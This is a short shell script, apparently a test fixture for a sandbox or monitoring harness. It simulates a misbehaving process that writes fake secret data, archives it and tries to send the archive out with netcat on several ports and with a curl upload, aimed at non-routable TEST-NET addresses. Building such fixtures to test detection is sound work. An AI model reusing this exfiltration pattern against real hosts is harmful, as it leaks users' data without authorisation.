# Misbehaving: packs the workspace and tries to send it out. Targets are
# TEST-NET addresses that route nowhere; only workspace bytes are sent.
N="$GLOVE_SCENARIO_NONCE"
printf 'secret-looking-but-fake %s\n' "$N" > data.txt
( /usr/bin/touch "/glove-onset-$N" ) 2>/dev/null
tar -czf bundle.tgz data.txt 2>/dev/null
for port in 443 80 8080 22; do
    ( /usr/bin/nc -w 1 192.0.2.10 "$port" < bundle.tgz ) >/dev/null 2>&1
done
( curl -s -m 2 -T bundle.tgz https://192.0.2.11/upload ) >/dev/null 2>&1
